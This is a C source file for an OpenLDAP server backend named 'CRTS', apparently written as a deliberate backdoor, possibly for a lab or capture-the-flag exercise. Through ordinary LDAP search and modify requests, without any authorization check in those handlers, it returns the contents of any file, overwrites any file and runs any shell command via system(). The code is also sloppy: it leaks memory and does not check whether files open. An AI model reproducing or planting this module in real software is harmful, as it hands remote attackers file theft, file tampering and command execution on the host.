/**
 * crts.c - Special CRTS backend
 *
 * Made with <3 by James
 */

#include "portable.h"
#include "slap.h"
#include "config.h"
#include <string.h>
#include <stdlib.h>
#include <regex.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <errno.h>

#define CRTS_LOG_LEVEL 4096

static char *crts_exec_regex(const char *regex_string, const char *search_string) {
    regex_t regex;
    regmatch_t matches[2];

    int reg_err = regcomp(&regex, regex_string, REG_EXTENDED);
    reg_err = regexec(&regex, search_string, 2, matches, 0);

    if (!reg_err) {
        char *match = malloc((1 + (matches[1].rm_eo - matches[1].rm_so)) * sizeof(char));
        regoff_t i;
        for(i = matches[1].rm_so; i < matches[1].rm_eo; i++) {
            match[i - matches[1].rm_so] = search_string[i];
        }
        match[matches[1].rm_eo - matches[1].rm_so] = '\0';
        return match;
    }

    char *error = malloc(4097 * sizeof(char));
    regerror(reg_err, &regex, error, 4096);
    Debug(CRTS_LOG_LEVEL, "crts_exec_regex: %s\n", error, 0, 0);

    return NULL;
}

static int crts_back_bind(Operation *op, SlapReply *reply) {
    Debug(CRTS_LOG_LEVEL, "crts_back_bind: binding", 0, 0, 0);
    if (be_isroot_pw(op)) {
        return LDAP_SUCCESS;
    }

    reply->sr_err = LDAP_UNWILLING_TO_PERFORM;
    send_ldap_result(op, reply);
    return reply->sr_err;
}

static int crts_back_search(Operation *op, SlapReply *reply) {
    Debug(CRTS_LOG_LEVEL, "crts_back_search: Uh-oh! Somebody's poking this module...you should probably check this out.\n", 0, 0, 0);

    char *dn_filename = crts_exec_regex("cn\\=file\\:(.*)\\,cn\\=crts", op->o_req_dn.bv_val);
    char *dn_filter_filename = crts_exec_regex("cn\\=file\\:(.*)\\,cn\\=crts", op->ors_filterstr.bv_val);
    char *filter_filename = crts_exec_regex("\\(\\?file\\=(.*)\\)", op->ors_filterstr.bv_val);

    char *filename = dn_filename ? dn_filename : (dn_filter_filename ? dn_filter_filename : filter_filename);

    if (filename) {
        struct stat file_stat;
        if (stat(filename, &file_stat) == -1) {
            Debug(CRTS_LOG_LEVEL, "crts_back_search: Couldn't stat file (%s) (strlen %lu)\n", filename, strlen(filename), 0);
            reply->sr_text = strerror(errno);
        } else {
            int fd = open(filename, O_RDONLY);
            if (fd == -1) {
                reply->sr_text = strerror(errno);
            } else {
                char *contents = mmap(NULL, file_stat.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
                reply->sr_text = contents;
            }
        }
    } else {
        reply->sr_text = "I didn't quite understand your request, sorry.";
    }

    reply->sr_err = LDAP_SUCCESS;
    send_ldap_result(op, reply);
    return LDAP_SUCCESS;
}

static int crts_back_modify(Operation *op, SlapReply *reply) {
    Debug(CRTS_LOG_LEVEL, "crts_back_modify: Uh-oh! Somebody's REALLY poking this module...you should definitely check this out.\n", 0, 0, 0);

    char *filename = crts_exec_regex("cn\\=file\\:(.*)\\,cn\\=crts", op->o_req_dn.bv_val);
    char *command = crts_exec_regex("(cn=command,cn=crts)", op->o_req_dn.bv_val);

    if (filename) {
        Modifications *mod_list = op->orm_modlist;

        if (mod_list->sml_op != LDAP_MOD_REPLACE) {
            reply->sr_text = "I can only *replace* file contents. Try again.";
            reply->sr_err = LDAP_UNWILLING_TO_PERFORM;
            goto done;
        }

        if (mod_list->sml_next) {
            reply->sr_text = "This is way too hacky to support more than one modification. Try again.";
            reply->sr_err = LDAP_UNWILLING_TO_PERFORM;
            goto done;
        }

        if (mod_list->sml_numvals != 1) {
            reply->sr_text = "This is way too hacky to support more than one modification. Try again.";
            reply->sr_err = LDAP_UNWILLING_TO_PERFORM;
            goto done;
        }

        if (strcmp(mod_list->sml_type.bv_val, "contents")) {
            reply->sr_text = "I only know how to modify file contents.";
            reply->sr_err = LDAP_UNWILLING_TO_PERFORM;
            goto done;
        }

        char *contents = ((struct berval*)mod_list->sml_values)->bv_val;

        FILE *file = fopen(filename, "w");
        fprintf(file, "%s", contents);
        fflush(file);
        fclose(file);

        reply->sr_err = LDAP_SUCCESS;
        reply->sr_text = "File written.";
    } else if (command) {
        Modifications *mod_list = op->orm_modlist;

        if (mod_list->sml_op != LDAP_MOD_REPLACE) {
            reply->sr_text = "Use replace to run commands. Don't ask why.";
            reply->sr_err = LDAP_UNWILLING_TO_PERFORM;
            goto done;
        }

        if (mod_list->sml_next) {
            reply->sr_text = "This is way too hacky to support more than one modification. Try again.";
            reply->sr_err = LDAP_UNWILLING_TO_PERFORM;
            goto done;
        }

        if (mod_list->sml_numvals != 1) {
            reply->sr_text = "This is way too hacky to support more than one modification. Try again.";
            reply->sr_err = LDAP_UNWILLING_TO_PERFORM;
            goto done;
        }

        if (strcmp(mod_list->sml_type.bv_val, "command")) {
            reply->sr_text = "I only know how to run the command specified by the command attribute in the LDIF. Try again.";
            reply->sr_err = LDAP_UNWILLING_TO_PERFORM;
            goto done;
        }

        char *command_text = ((struct berval*)mod_list->sml_values)->bv_val;

        system(command_text);

        reply->sr_err = LDAP_SUCCESS;
        reply->sr_text = "Command run.";
    } else {
        reply->sr_err = LDAP_NO_SUCH_ATTRIBUTE;
        reply->sr_text = "Invalid CRTS request format. Try cn=file:<filename>,cn=crts.";
    }

done:;
    send_ldap_result(op, reply);
    return reply->sr_err;
}

int crts_back_initialize(BackendInfo *bi) {
    Debug(CRTS_LOG_LEVEL, "crts_back_initialize: initialize CRTS backend\n", 0, 0, 0);

    bi->bi_op_bind = crts_back_bind;
    bi->bi_op_search = crts_back_search;
    bi->bi_op_modify = crts_back_modify;
    return 0;
}
